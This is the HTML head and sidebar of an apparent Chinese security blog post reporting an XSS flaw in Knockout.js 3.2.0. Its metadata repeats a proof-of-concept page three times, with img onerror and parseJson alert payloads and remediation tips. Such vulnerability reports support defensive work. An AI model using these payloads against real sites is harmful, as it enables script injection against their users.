<!DOCTYPE html>
<html lang="zh-cn" dir="ltr">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1316&amp;path=livereload" data-no-instant defer></script><meta charset='utf-8'>
<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content="漏洞URL 1 https://xxxx/xx/xxx/knockout/knockout-3.2.0.debug.js 风险详情 1 攻击者利用脚本注入提供了“合法入口”（组件渲染逻辑未过滤 HTML 代码）。攻击门槛低，无需复杂技术，现成 payload 可直接利用。 漏洞证明 文件下载 1 2 3 通过网盘分享的文件：knockout_xss_test.7z 链接: https://pan.baidu.com/s/1g9cCWf1ryzcP4F3n6qDAnQ 提取码: wtxx --来自百度网盘超级会员v4的分享 POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;Knockout.js 3.2.0 XSS漏洞测试&lt;/title&gt; &lt;style&gt; body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; } .test-case { margin-bottom: 30px; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background-color: #f9f9f9; } h2 { color: #333; border-bottom: 2px solid #333; padding-bottom: 5px; } input[type=&#34;text&#34;] { width: 100%; padding: 8px; margin: 10px 0; box-sizing: border-box; } button { padding: 10px 15px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; } button:hover { background-color: #45a049; } .result { margin-top: 15px; padding: 10px; background-color: #e8e8e8; border-radius: 4px; } .warning { color: #ff4444; font-weight: bold; } pre { background-color: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; } .security-tips { background-color: #fff3cd; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin-top: 20px; } &lt;/style&gt; &lt;!-- 引入Knockout.js 3.2.0 --&gt; &lt;script src=&#34;knockout-3.2.0.debug.js&#34;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Knockout.js 3.2.0 XSS漏洞测试&lt;/h1&gt; &lt;!-- 测试用例1: HTML绑定XSS漏洞 --&gt; &lt;div class=&#34;test-case&#34;&gt; &lt;h2&gt;测试用例1: HTML绑定XSS漏洞&lt;/h2&gt; &lt;p&gt;Knockout.js的html绑定直接将内容渲染为HTML，没有进行任何转义，这是一个明显的XSS漏洞。&lt;/p&gt; &lt;p class=&#34;warning&#34;&gt;⚠️ 注意：请不要在生产环境中使用此绑定处理来自不可信源的数据！&lt;/p&gt; &lt;div&gt; &lt;label for=&#34;htmlInput&#34;&gt;输入可能包含XSS的内容:&lt;/label&gt; &lt;input type=&#34;text&#34; id=&#34;htmlInput&#34; data-bind=&#34;value: htmlContent&#34;&gt; &lt;button data-bind=&#34;click: updateHtml&#34;&gt;更新内容&lt;/button&gt; &lt;/div&gt; &lt;div class=&#34;result&#34;&gt; &lt;p&gt;渲染结果 (使用html绑定):&lt;/p&gt; &lt;div data-bind=&#34;html: htmlContent&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;result&#34;&gt; &lt;p&gt;安全渲染结果 (使用text绑定):&lt;/p&gt; &lt;div data-bind=&#34;text: htmlContent&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;pre&gt;示例Payload: &amp;lt;img src=x onerror=alert(&#39;XSS via html binding&#39;)&amp;gt;&lt;/pre&gt; &lt;/div&gt; &lt;!-- 测试用例2: parseJson函数XSS漏洞 --&gt; &lt;div class=&#34;test-case&#34;&gt; &lt;h2&gt;测试用例2: parseJson函数XSS漏洞&lt;/h2&gt; &lt;p&gt;在不支持JSON.parse的旧浏览器中，ko.utils.parseJson使用new Function()来解析JSON，这允许执行任意JavaScript代码。&lt;/p&gt; &lt;p class=&#34;warning&#34;&gt;⚠️ 注意：这个漏洞在现代浏览器中不适用，但在IE8等旧浏览器中存在风险！&lt;/p&gt; &lt;div&gt; &lt;label for=&#34;jsonInput&#34;&gt;输入恶意JSON:&lt;/label&gt; &lt;input type=&#34;text&#34; id=&#34;jsonInput&#34; value=&#34;{\\&#34;x\\&#34;:\\&#34;y\\&#34;}&#34; data-bind=&#34;value: jsonContent&#34;&gt; &lt;button data-bind=&#34;click: parseJson&#34;&gt;解析JSON&lt;/button&gt; &lt;/div&gt; &lt;div class=&#34;result&#34; data-bind=&#34;text: jsonParseResult&#34;&gt;&lt;/div&gt; &lt;pre&gt;示例Payload (仅在旧浏览器中有效): {&#34;x&#34;:alert(&#39;XSS via parseJson&#39;)}&lt;/pre&gt; &lt;/div&gt; &lt;!-- 安全修复建议 --&gt; &lt;div class=&#34;security-tips&#34;&gt; &lt;h2&gt;安全修复建议&lt;/h2&gt; &lt;ul&gt; &lt;li&gt;&lt;strong&gt;避免使用html绑定:&lt;/strong&gt; 除非完全信任数据源，否则应使用text绑定替代html绑定&lt;/li&gt; &lt;li&gt;&lt;strong&gt;升级Knockout.js版本:&lt;/strong&gt; 升级到最新版本，可能包含安全修复&lt;/li&gt; &lt;li&gt;&lt;strong&gt;实施内容安全策略(CSP):&lt;/strong&gt; 在服务器端配置CSP头，防止内联脚本执行&lt;/li&gt; &lt;li&gt;&lt;strong&gt;输入验证和转义:&lt;/strong&gt; 对所有用户输入进行验证和HTML转义&lt;/li&gt; &lt;li&gt;&lt;strong&gt;使用现代浏览器:&lt;/strong&gt; 确保用户使用支持JSON.parse的现代浏览器&lt;/li&gt; &lt;li&gt;&lt;strong&gt;创建自定义安全绑定:&lt;/strong&gt; 实现自己的安全HTML绑定，对内容进行过滤&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script&gt; // 测试ViewModel function TestViewModel() { var self = this; // 测试用例1 self.htmlContent = ko.observable(&#39;&lt;img src=x onerror=alert(&#34;XSS via html binding&#34;)&gt;&#39;); self.updateHtml = function() { // 直接更新内容，不做任何转义 }; // 测试用例2 self.jsonContent = ko.observable(&#39;{&#34;x&#34;:&#34;y&#34;}&#39;); self.jsonParseResult = ko.observable(&#39;&#39;); self.parseJson = function() { try { // 保存原始的JSON.parse函数 var originalJSONParse = JSON.parse; // 模拟旧浏览器环境 (移除JSON.parse) JSON.parse = undefined; // 尝试解析JSON var result = ko.utils.parseJson(self.jsonContent()); self.jsonParseResult(&#39;解析成功: &#39; + JSON.stringify(result)); // 恢复原始的JSON.parse函数 JSON.parse = originalJSONParse; } catch (e) { self.jsonParseResult(&#39;解析错误: &#39; + e.message); // 确保恢复JSON.parse JSON.parse = originalJSONParse; } }; } // 应用绑定 ko.applyBindings(new TestViewModel()); // 创建一个自定义的安全HTML绑定示例 ko.bindingHandlers.safeHtml = { init: function() { return { &#39;controlsDescendantBindings&#39;: true }; }, update: function(element, valueAccessor) { var html = ko.utils.unwrapObservable(valueAccessor()); if (html &amp;&amp; typeof html === &#39;string&#39;) { // 简单的HTML过滤示例 var safeHtml = html .replace(/&amp;/g, &#39;&amp;amp;&#39;) .replace(/&lt;/g, &#39;&amp;lt;&#39;) .replace(/&gt;/g, &#39;&amp;gt;&#39;) .replace(/&#34;/g, &#39;&amp;quot;&#39;) .replace(/&#39;/g, &#39;&amp;#039;&#39;); ko.utils.setHtml(element, safeHtml); } } }; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 测试 下载booknockout-3.2.0.debug.js文件，发现parseJson函数允许执行任意JavaScript代码，编写POC进行复现，如图所示：\n">
<title>【Knockout.js】3.2.0版本过低导致XSS漏洞（中危）</title>

<link rel='canonical' href='http://localhost:1316/p/knockout.js3.2.0%E7%89%88%E6%9C%AC%E8%BF%87%E4%BD%8E%E5%AF%BC%E8%87%B4xss%E6%BC%8F%E6%B4%9E%E4%B8%AD%E5%8D%B1/'>

<link rel="stylesheet" href="/scss/style.min.3f80c356f93d6cdfe696883a3b8ecd0c4ad7670e02d4ec7b7c0fcf6cf9bbe703.css"><meta property='og:title' content="【Knockout.js】3.2.0版本过低导致XSS漏洞（中危）">
<meta property='og:description' content="漏洞URL 1 https://xxxx/xx/xxx/knockout/knockout-3.2.0.debug.js 风险详情 1 攻击者利用脚本注入提供了“合法入口”（组件渲染逻辑未过滤 HTML 代码）。攻击门槛低，无需复杂技术，现成 payload 可直接利用。 漏洞证明 文件下载 1 2 3 通过网盘分享的文件：knockout_xss_test.7z 链接: https://pan.baidu.com/s/1g9cCWf1ryzcP4F3n6qDAnQ 提取码: wtxx --来自百度网盘超级会员v4的分享 POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;Knockout.js 3.2.0 XSS漏洞测试&lt;/title&gt; &lt;style&gt; body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; } .test-case { margin-bottom: 30px; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background-color: #f9f9f9; } h2 { color: #333; border-bottom: 2px solid #333; padding-bottom: 5px; } input[type=&#34;text&#34;] { width: 100%; padding: 8px; margin: 10px 0; box-sizing: border-box; } button { padding: 10px 15px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; } button:hover { background-color: #45a049; } .result { margin-top: 15px; padding: 10px; background-color: #e8e8e8; border-radius: 4px; } .warning { color: #ff4444; font-weight: bold; } pre { background-color: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; } .security-tips { background-color: #fff3cd; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin-top: 20px; } &lt;/style&gt; &lt;!-- 引入Knockout.js 3.2.0 --&gt; &lt;script src=&#34;knockout-3.2.0.debug.js&#34;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Knockout.js 3.2.0 XSS漏洞测试&lt;/h1&gt; &lt;!-- 测试用例1: HTML绑定XSS漏洞 --&gt; &lt;div class=&#34;test-case&#34;&gt; &lt;h2&gt;测试用例1: HTML绑定XSS漏洞&lt;/h2&gt; &lt;p&gt;Knockout.js的html绑定直接将内容渲染为HTML，没有进行任何转义，这是一个明显的XSS漏洞。&lt;/p&gt; &lt;p class=&#34;warning&#34;&gt;⚠️ 注意：请不要在生产环境中使用此绑定处理来自不可信源的数据！&lt;/p&gt; &lt;div&gt; &lt;label for=&#34;htmlInput&#34;&gt;输入可能包含XSS的内容:&lt;/label&gt; &lt;input type=&#34;text&#34; id=&#34;htmlInput&#34; data-bind=&#34;value: htmlContent&#34;&gt; &lt;button data-bind=&#34;click: updateHtml&#34;&gt;更新内容&lt;/button&gt; &lt;/div&gt; &lt;div class=&#34;result&#34;&gt; &lt;p&gt;渲染结果 (使用html绑定):&lt;/p&gt; &lt;div data-bind=&#34;html: htmlContent&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;result&#34;&gt; &lt;p&gt;安全渲染结果 (使用text绑定):&lt;/p&gt; &lt;div data-bind=&#34;text: htmlContent&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;pre&gt;示例Payload: &amp;lt;img src=x onerror=alert(&#39;XSS via html binding&#39;)&amp;gt;&lt;/pre&gt; &lt;/div&gt; &lt;!-- 测试用例2: parseJson函数XSS漏洞 --&gt; &lt;div class=&#34;test-case&#34;&gt; &lt;h2&gt;测试用例2: parseJson函数XSS漏洞&lt;/h2&gt; &lt;p&gt;在不支持JSON.parse的旧浏览器中，ko.utils.parseJson使用new Function()来解析JSON，这允许执行任意JavaScript代码。&lt;/p&gt; &lt;p class=&#34;warning&#34;&gt;⚠️ 注意：这个漏洞在现代浏览器中不适用，但在IE8等旧浏览器中存在风险！&lt;/p&gt; &lt;div&gt; &lt;label for=&#34;jsonInput&#34;&gt;输入恶意JSON:&lt;/label&gt; &lt;input type=&#34;text&#34; id=&#34;jsonInput&#34; value=&#34;{\\&#34;x\\&#34;:\\&#34;y\\&#34;}&#34; data-bind=&#34;value: jsonContent&#34;&gt; &lt;button data-bind=&#34;click: parseJson&#34;&gt;解析JSON&lt;/button&gt; &lt;/div&gt; &lt;div class=&#34;result&#34; data-bind=&#34;text: jsonParseResult&#34;&gt;&lt;/div&gt; &lt;pre&gt;示例Payload (仅在旧浏览器中有效): {&#34;x&#34;:alert(&#39;XSS via parseJson&#39;)}&lt;/pre&gt; &lt;/div&gt; &lt;!-- 安全修复建议 --&gt; &lt;div class=&#34;security-tips&#34;&gt; &lt;h2&gt;安全修复建议&lt;/h2&gt; &lt;ul&gt; &lt;li&gt;&lt;strong&gt;避免使用html绑定:&lt;/strong&gt; 除非完全信任数据源，否则应使用text绑定替代html绑定&lt;/li&gt; &lt;li&gt;&lt;strong&gt;升级Knockout.js版本:&lt;/strong&gt; 升级到最新版本，可能包含安全修复&lt;/li&gt; &lt;li&gt;&lt;strong&gt;实施内容安全策略(CSP):&lt;/strong&gt; 在服务器端配置CSP头，防止内联脚本执行&lt;/li&gt; &lt;li&gt;&lt;strong&gt;输入验证和转义:&lt;/strong&gt; 对所有用户输入进行验证和HTML转义&lt;/li&gt; &lt;li&gt;&lt;strong&gt;使用现代浏览器:&lt;/strong&gt; 确保用户使用支持JSON.parse的现代浏览器&lt;/li&gt; &lt;li&gt;&lt;strong&gt;创建自定义安全绑定:&lt;/strong&gt; 实现自己的安全HTML绑定，对内容进行过滤&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script&gt; // 测试ViewModel function TestViewModel() { var self = this; // 测试用例1 self.htmlContent = ko.observable(&#39;&lt;img src=x onerror=alert(&#34;XSS via html binding&#34;)&gt;&#39;); self.updateHtml = function() { // 直接更新内容，不做任何转义 }; // 测试用例2 self.jsonContent = ko.observable(&#39;{&#34;x&#34;:&#34;y&#34;}&#39;); self.jsonParseResult = ko.observable(&#39;&#39;); self.parseJson = function() { try { // 保存原始的JSON.parse函数 var originalJSONParse = JSON.parse; // 模拟旧浏览器环境 (移除JSON.parse) JSON.parse = undefined; // 尝试解析JSON var result = ko.utils.parseJson(self.jsonContent()); self.jsonParseResult(&#39;解析成功: &#39; + JSON.stringify(result)); // 恢复原始的JSON.parse函数 JSON.parse = originalJSONParse; } catch (e) { self.jsonParseResult(&#39;解析错误: &#39; + e.message); // 确保恢复JSON.parse JSON.parse = originalJSONParse; } }; } // 应用绑定 ko.applyBindings(new TestViewModel()); // 创建一个自定义的安全HTML绑定示例 ko.bindingHandlers.safeHtml = { init: function() { return { &#39;controlsDescendantBindings&#39;: true }; }, update: function(element, valueAccessor) { var html = ko.utils.unwrapObservable(valueAccessor()); if (html &amp;&amp; typeof html === &#39;string&#39;) { // 简单的HTML过滤示例 var safeHtml = html .replace(/&amp;/g, &#39;&amp;amp;&#39;) .replace(/&lt;/g, &#39;&amp;lt;&#39;) .replace(/&gt;/g, &#39;&amp;gt;&#39;) .replace(/&#34;/g, &#39;&amp;quot;&#39;) .replace(/&#39;/g, &#39;&amp;#039;&#39;); ko.utils.setHtml(element, safeHtml); } } }; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 测试 下载booknockout-3.2.0.debug.js文件，发现parseJson函数允许执行任意JavaScript代码，编写POC进行复现，如图所示：\n">
<meta property='og:url' content='http://localhost:1316/p/knockout.js3.2.0%E7%89%88%E6%9C%AC%E8%BF%87%E4%BD%8E%E5%AF%BC%E8%87%B4xss%E6%BC%8F%E6%B4%9E%E4%B8%AD%E5%8D%B1/'>
<meta property='og:site_name' content='SlimerのBlog'>
<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:published_time' content='2025-09-09T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2025-09-09T00:00:00&#43;00:00'/><meta property='og:image' content='http://localhost:1316/images/55.webp' />
<meta name="twitter:title" content="【Knockout.js】3.2.0版本过低导致XSS漏洞（中危）">
<meta name="twitter:description" content="漏洞URL 1 https://xxxx/xx/xxx/knockout/knockout-3.2.0.debug.js 风险详情 1 攻击者利用脚本注入提供了“合法入口”（组件渲染逻辑未过滤 HTML 代码）。攻击门槛低，无需复杂技术，现成 payload 可直接利用。 漏洞证明 文件下载 1 2 3 通过网盘分享的文件：knockout_xss_test.7z 链接: https://pan.baidu.com/s/1g9cCWf1ryzcP4F3n6qDAnQ 提取码: wtxx --来自百度网盘超级会员v4的分享 POC 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 111 112 113 114 115 116 117 118 119 120 121 122 123 124 125 126 127 128 129 130 131 132 133 134 135 136 137 138 139 140 141 142 &lt;!DOCTYPE html&gt; &lt;html lang=&#34;zh-CN&#34;&gt; &lt;head&gt; &lt;meta charset=&#34;UTF-8&#34;&gt; &lt;meta name=&#34;viewport&#34; content=&#34;width=device-width, initial-scale=1.0&#34;&gt; &lt;title&gt;Knockout.js 3.2.0 XSS漏洞测试&lt;/title&gt; &lt;style&gt; body { font-family: Arial, sans-serif; margin: 20px; line-height: 1.6; } .test-case { margin-bottom: 30px; padding: 20px; border: 1px solid #ddd; border-radius: 5px; background-color: #f9f9f9; } h2 { color: #333; border-bottom: 2px solid #333; padding-bottom: 5px; } input[type=&#34;text&#34;] { width: 100%; padding: 8px; margin: 10px 0; box-sizing: border-box; } button { padding: 10px 15px; background-color: #4CAF50; color: white; border: none; border-radius: 4px; cursor: pointer; } button:hover { background-color: #45a049; } .result { margin-top: 15px; padding: 10px; background-color: #e8e8e8; border-radius: 4px; } .warning { color: #ff4444; font-weight: bold; } pre { background-color: #f5f5f5; padding: 10px; border-radius: 4px; overflow-x: auto; } .security-tips { background-color: #fff3cd; padding: 15px; border: 1px solid #ffeaa7; border-radius: 5px; margin-top: 20px; } &lt;/style&gt; &lt;!-- 引入Knockout.js 3.2.0 --&gt; &lt;script src=&#34;knockout-3.2.0.debug.js&#34;&gt;&lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;h1&gt;Knockout.js 3.2.0 XSS漏洞测试&lt;/h1&gt; &lt;!-- 测试用例1: HTML绑定XSS漏洞 --&gt; &lt;div class=&#34;test-case&#34;&gt; &lt;h2&gt;测试用例1: HTML绑定XSS漏洞&lt;/h2&gt; &lt;p&gt;Knockout.js的html绑定直接将内容渲染为HTML，没有进行任何转义，这是一个明显的XSS漏洞。&lt;/p&gt; &lt;p class=&#34;warning&#34;&gt;⚠️ 注意：请不要在生产环境中使用此绑定处理来自不可信源的数据！&lt;/p&gt; &lt;div&gt; &lt;label for=&#34;htmlInput&#34;&gt;输入可能包含XSS的内容:&lt;/label&gt; &lt;input type=&#34;text&#34; id=&#34;htmlInput&#34; data-bind=&#34;value: htmlContent&#34;&gt; &lt;button data-bind=&#34;click: updateHtml&#34;&gt;更新内容&lt;/button&gt; &lt;/div&gt; &lt;div class=&#34;result&#34;&gt; &lt;p&gt;渲染结果 (使用html绑定):&lt;/p&gt; &lt;div data-bind=&#34;html: htmlContent&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;div class=&#34;result&#34;&gt; &lt;p&gt;安全渲染结果 (使用text绑定):&lt;/p&gt; &lt;div data-bind=&#34;text: htmlContent&#34;&gt;&lt;/div&gt; &lt;/div&gt; &lt;pre&gt;示例Payload: &amp;lt;img src=x onerror=alert(&#39;XSS via html binding&#39;)&amp;gt;&lt;/pre&gt; &lt;/div&gt; &lt;!-- 测试用例2: parseJson函数XSS漏洞 --&gt; &lt;div class=&#34;test-case&#34;&gt; &lt;h2&gt;测试用例2: parseJson函数XSS漏洞&lt;/h2&gt; &lt;p&gt;在不支持JSON.parse的旧浏览器中，ko.utils.parseJson使用new Function()来解析JSON，这允许执行任意JavaScript代码。&lt;/p&gt; &lt;p class=&#34;warning&#34;&gt;⚠️ 注意：这个漏洞在现代浏览器中不适用，但在IE8等旧浏览器中存在风险！&lt;/p&gt; &lt;div&gt; &lt;label for=&#34;jsonInput&#34;&gt;输入恶意JSON:&lt;/label&gt; &lt;input type=&#34;text&#34; id=&#34;jsonInput&#34; value=&#34;{\\&#34;x\\&#34;:\\&#34;y\\&#34;}&#34; data-bind=&#34;value: jsonContent&#34;&gt; &lt;button data-bind=&#34;click: parseJson&#34;&gt;解析JSON&lt;/button&gt; &lt;/div&gt; &lt;div class=&#34;result&#34; data-bind=&#34;text: jsonParseResult&#34;&gt;&lt;/div&gt; &lt;pre&gt;示例Payload (仅在旧浏览器中有效): {&#34;x&#34;:alert(&#39;XSS via parseJson&#39;)}&lt;/pre&gt; &lt;/div&gt; &lt;!-- 安全修复建议 --&gt; &lt;div class=&#34;security-tips&#34;&gt; &lt;h2&gt;安全修复建议&lt;/h2&gt; &lt;ul&gt; &lt;li&gt;&lt;strong&gt;避免使用html绑定:&lt;/strong&gt; 除非完全信任数据源，否则应使用text绑定替代html绑定&lt;/li&gt; &lt;li&gt;&lt;strong&gt;升级Knockout.js版本:&lt;/strong&gt; 升级到最新版本，可能包含安全修复&lt;/li&gt; &lt;li&gt;&lt;strong&gt;实施内容安全策略(CSP):&lt;/strong&gt; 在服务器端配置CSP头，防止内联脚本执行&lt;/li&gt; &lt;li&gt;&lt;strong&gt;输入验证和转义:&lt;/strong&gt; 对所有用户输入进行验证和HTML转义&lt;/li&gt; &lt;li&gt;&lt;strong&gt;使用现代浏览器:&lt;/strong&gt; 确保用户使用支持JSON.parse的现代浏览器&lt;/li&gt; &lt;li&gt;&lt;strong&gt;创建自定义安全绑定:&lt;/strong&gt; 实现自己的安全HTML绑定，对内容进行过滤&lt;/li&gt; &lt;/ul&gt; &lt;/div&gt; &lt;script&gt; // 测试ViewModel function TestViewModel() { var self = this; // 测试用例1 self.htmlContent = ko.observable(&#39;&lt;img src=x onerror=alert(&#34;XSS via html binding&#34;)&gt;&#39;); self.updateHtml = function() { // 直接更新内容，不做任何转义 }; // 测试用例2 self.jsonContent = ko.observable(&#39;{&#34;x&#34;:&#34;y&#34;}&#39;); self.jsonParseResult = ko.observable(&#39;&#39;); self.parseJson = function() { try { // 保存原始的JSON.parse函数 var originalJSONParse = JSON.parse; // 模拟旧浏览器环境 (移除JSON.parse) JSON.parse = undefined; // 尝试解析JSON var result = ko.utils.parseJson(self.jsonContent()); self.jsonParseResult(&#39;解析成功: &#39; + JSON.stringify(result)); // 恢复原始的JSON.parse函数 JSON.parse = originalJSONParse; } catch (e) { self.jsonParseResult(&#39;解析错误: &#39; + e.message); // 确保恢复JSON.parse JSON.parse = originalJSONParse; } }; } // 应用绑定 ko.applyBindings(new TestViewModel()); // 创建一个自定义的安全HTML绑定示例 ko.bindingHandlers.safeHtml = { init: function() { return { &#39;controlsDescendantBindings&#39;: true }; }, update: function(element, valueAccessor) { var html = ko.utils.unwrapObservable(valueAccessor()); if (html &amp;&amp; typeof html === &#39;string&#39;) { // 简单的HTML过滤示例 var safeHtml = html .replace(/&amp;/g, &#39;&amp;amp;&#39;) .replace(/&lt;/g, &#39;&amp;lt;&#39;) .replace(/&gt;/g, &#39;&amp;gt;&#39;) .replace(/&#34;/g, &#39;&amp;quot;&#39;) .replace(/&#39;/g, &#39;&amp;#039;&#39;); ko.utils.setHtml(element, safeHtml); } } }; &lt;/script&gt; &lt;/body&gt; &lt;/html&gt; 测试 下载booknockout-3.2.0.debug.js文件，发现parseJson函数允许执行任意JavaScript代码，编写POC进行复现，如图所示：\n"><meta name="twitter:card" content="summary_large_image">
    <meta name="twitter:image" content='http://localhost:1316/images/55.webp' />
    <link rel="shortcut icon" href="/favicon.ico" />

    </head>
    <body class="
    article-page
    ">
    <script>
        (function() {
            const colorSchemeKey = 'StackColorScheme';
            localStorage.setItem(colorSchemeKey, "auto");
        })();
    </script><script>
    (function() {
        const colorSchemeKey = 'StackColorScheme';
        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;

        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
            

            document.documentElement.dataset.scheme = 'dark';
        } else {
            document.documentElement.dataset.scheme = 'light';
        }
    })();
</script>
<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="切换菜单">
        <span class="hamburger-box">
            <span class="hamburger-inner"></span>
        </span>
    </button>

    <header>
        
            
            <figure class="site-avatar">
                <a href="/">
                
                    
                    
                    
                        
                        <img src="/img/avatar_hu_1bd8e8462945ae7f.png" width="300"
                            height="300" class="site-logo" loading="lazy" alt="Avatar">
                    
                
                </a>
                
            </figure>
            
        
        
        <div class="site-meta">
            <h1 class="site-name"><a href="/">SlimerのBlog</a></h1>
            <h2 class="site-description"></h2>
        </div>
    </header><ol class="menu-social">
            
                <li>
                    <a 
                        href='https://space.bilibili.com/274685458?spm_id_from=333.1007.0.0'
                        target="_blank"
                        title="bilibili"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1756871816299" class="icon" viewBox="0 0 1084 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="3388" xmlns:xlink="http://www.w3.org/1999/xlink" width="271" height="256"><path d="M896.43834 165.698h-62.34l54.57-54.57c23.43-23.37 23.43-70.17 0-93.54-23.37-23.37-70.17-23.37-93.54 0l-155.88 148.17H452.17034l-155.94-148.23c-23.43-23.37-70.17-23.37-93.54 0-23.37 23.43-23.43 70.17 0 93.54l54.57 54.57h-62.34A192.983 192.983 0 0 0 0.00934 360.607v420.899c0 116.97 85.71 202.68 194.91 202.68h693.75a192.983 192.983 0 0 0 194.85-194.85v-428.73c7.83-109.14-77.94-194.91-187.08-194.91z m54.63 615.809a69.869 69.869 0 0 1-70.17 70.17h-678.27a69.869 69.869 0 0 1-70.109-70.17v-413.13a69.869 69.869 0 0 1 70.17-70.17h678.21a69.869 69.869 0 0 1 70.17 70.17v413.19z m-608.039-342.96a69.869 69.869 0 0 0-70.23 70.17v70.17a69.869 69.869 0 0 0 70.17 70.17 69.869 69.869 0 0 0 70.23-70.17v-70.17a69.869 69.869 0 0 0-70.23-70.17z m405.36 0a69.869 69.869 0 0 0-70.23 70.17v70.17a69.869 69.869 0 0 0 70.17 70.17 69.869 69.869 0 0 0 70.23-70.17v-70.17a69.869 69.869 0 0 0-70.17-70.17z" p-id="3389" fill="#d4237a"></path></svg>
                        
                    </a>
                </li>
            
                <li>
                    <a 
                        href='https://github.com/SSlimes'
                        target="_blank"
                        title="GitHub"
                        rel="me"
                    >
                        
                        
                            <?xml version="1.0" standalone="no"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg t="1756871620871" class="icon" viewBox="0 0 1024 1024" version="1.1" xmlns="http://www.w3.org/2000/svg" p-id="9490" xmlns:xlink="http://www.w3.org/1999/xlink" width="256" height="256"><path d="M682.215454 981.446137c-25.532318 0-42.553863-17.021545-42.553864-42.553864v-165.960067c4.255386-34.043091-8.510773-59.575409-29.787704-80.852341-12.766159-12.766159-17.021545-29.787704-8.510773-42.553864 4.255386-17.021545 21.276932-25.532318 34.043091-29.787704 123.406204-12.766159 238.301635-55.320023 238.301635-255.323181 0-46.80925-17.021545-93.6185-51.064636-131.916976-12.766159-12.766159-12.766159-29.787704-8.510772-42.553864 12.766159-34.043091 12.766159-68.086182 4.255386-102.129272-21.276932 4.255386-55.320023 17.021545-110.640045 55.320022-8.510773 8.510773-21.276932 8.510773-34.043091 4.255387-89.363113-25.532318-187.236999-25.532318-276.600112 0-12.766159 4.255386-25.532318 4.255386-38.298477-4.255387C307.741455 104.836549 269.442978 92.07039 248.166047 87.815004c-8.510773 34.043091-8.510773 68.086182 4.255386 102.129272 4.255386 17.021545 4.255386 34.043091-8.510773 42.553864-34.043091 38.298477-51.064636 85.107727-51.064636 131.916976 0 200.003158 114.895431 242.557022 238.301635 255.323181 17.021545 0 29.787704 12.766159 34.043091 29.787704 4.255386 17.021545 0 34.043091-8.510773 42.553864-21.276932 21.276932-29.787704 46.80925-29.787704 76.596954v165.960068c0 25.532318-17.021545 42.553863-42.553863 